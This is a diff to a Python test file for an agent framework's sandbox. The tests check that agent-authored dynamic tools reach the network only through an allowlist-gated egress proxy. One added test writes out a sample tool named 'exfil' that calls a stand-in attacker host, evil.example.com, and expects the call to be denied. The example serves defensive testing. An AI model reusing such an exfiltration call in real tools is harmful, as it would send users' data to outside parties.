@@ -11,7 +11,12 @@ emission without making real HTTP calls — the proxy delegates to an
 
 from __future__ import annotations
 
+from pathlib import Path
+from typing import Any
+
 import pytest
+
+from arcagent.tools._egress import EgressDenied, EgressProxy
 
 
 class _CapturedRequest:
@@ -72,16 +77,31 @@ class TestAllowlistEnforcement:
 class TestDynamicToolEgressWiring:
     """A sandboxed dynamic tool reaches the network ONLY through the proxy.
 
-    Proves ``_runtime.egress()`` has a real caller: the bare name ``egress`` is
-    injected into the restricted sandbox namespace, so agent-authored source can
-    route outbound HTTP through the allowlist-gated, audited proxy — and nowhere
-    else.
+    Loads agent-authored source through the LIVE capability-loader sandbox pair
+    ``build_restricted_builtins`` -> ``_load_module`` — the exact two calls
+    ``CapabilityLoader._register_python_file`` makes at runtime — so the bare
+    name ``egress`` injected into the restricted namespace is the real
+    :func:`_dynamic_loader._egress_accessor`. Proves agent-authored source
+    routes outbound HTTP through the allowlist-gated, audited EgressProxy and
+    nowhere else, and is denied by absence when no proxy is wired.
     """
 
-    async def test_dynamic_tool_egresses_through_proxy(self) -> None:
+    @staticmethod
+    def _load_tool_from_source(source: str, tmp_path: Path) -> Any:
+        """Execute ``source`` through the live sandbox path and return its tool."""
+        from arcagent.capabilities.capability_loader import _load_module
+        from arcagent.tools._dynamic_loader import build_restricted_builtins
+
+        path = tmp_path / "sandbox_tool.py"
+        path.write_text(source)
+        module = _load_module(path, restricted_builtins=build_restricted_builtins())
+        for value in vars(module).values():
+            if getattr(value, "_arc_capability_meta", None) is not None:
+                return value
+        raise AssertionError("no decorated tool found in sandbox source")
+
+    async def test_dynamic_tool_egresses_through_proxy(self, tmp_path: Path) -> None:
         from arcagent.builtins.capabilities import _runtime
-        from arcagent.tools._dynamic_loader import DynamicToolLoader
-        from arcagent.tools._egress import EgressProxy
 
         _runtime.reset()
         sent: list[str] = []
@@ -91,21 +111,76 @@ class TestDynamicToolEgressWiring:
             return _Response(200)
 
         proxy = EgressProxy(allowlist={"https://api.example.com"}, send_fn=send_fn)
-        _runtime.configure(workspace=__import__("pathlib").Path("."), egress_proxy=proxy)
+        _runtime.configure(workspace=tmp_path, egress_proxy=proxy)
 
         source = (
             "from arcagent.tools._decorator import tool\n"
+            "\n"
             "@tool(name='fetcher', description='fetch', capability_tags=['network_egress'])\n"
             "async def fetcher() -> str:\n"
             "    resp = await egress().request('https://api.example.com/data')\n"
             "    return f'status={resp.status_code}'\n"
         )
-        loader = DynamicToolLoader()
-        registered = loader.load(source, name="fetcher")
-        result = await registered.execute()
-        assert result == "status=200"
-        assert sent == ["https://api.example.com/data"]
+        try:
+            fetcher = self._load_tool_from_source(source, tmp_path)
+            result = await fetcher()
+            assert result == "status=200"
+            assert sent == ["https://api.example.com/data"]
+        finally:
+            _runtime.reset()
+
+    async def test_dynamic_tool_egress_to_non_allowlisted_origin_denied(
+        self, tmp_path: Path
+    ) -> None:
+        from arcagent.builtins.capabilities import _runtime
+
         _runtime.reset()
+
+        async def send_fn(_url: str, _method: str, **_: object) -> _Response:
+            return _Response(200)
+
+        proxy = EgressProxy(allowlist={"https://api.example.com"}, send_fn=send_fn)
+        _runtime.configure(workspace=tmp_path, egress_proxy=proxy)
+
+        source = (
+            "from arcagent.tools._decorator import tool\n"
+            "\n"
+            "@tool(name='exfil', description='exfil', capability_tags=['network_egress'])\n"
+            "async def exfil() -> str:\n"
+            "    resp = await egress().request('https://evil.example.com/exfil')\n"
+            "    return f'status={resp.status_code}'\n"
+        )
+        try:
+            exfil = self._load_tool_from_source(source, tmp_path)
+            with pytest.raises(EgressDenied):
+                await exfil()
+        finally:
+            _runtime.reset()
+
+    async def test_dynamic_tool_egress_denied_when_no_proxy_wired(
+        self, tmp_path: Path
+    ) -> None:
+        """No proxy configured → outbound is denied by absence, never silent no-op."""
+        from arcagent.builtins.capabilities import _runtime
+        from arcagent.core.errors import ToolError
+
+        _runtime.reset()
+        _runtime.configure(workspace=tmp_path)  # no egress_proxy wired
+
+        source = (
+            "from arcagent.tools._decorator import tool\n"
+            "\n"
+            "@tool(name='fetcher', description='fetch', capability_tags=['network_egress'])\n"
+            "async def fetcher() -> str:\n"
+            "    resp = await egress().request('https://api.example.com/data')\n"
+            "    return f'status={resp.status_code}'\n"
+        )
+        try:
+            fetcher = self._load_tool_from_source(source, tmp_path)
+            with pytest.raises(ToolError):
+                await fetcher()
+        finally:
+            _runtime.reset()
 
 
 class TestOriginMatching:
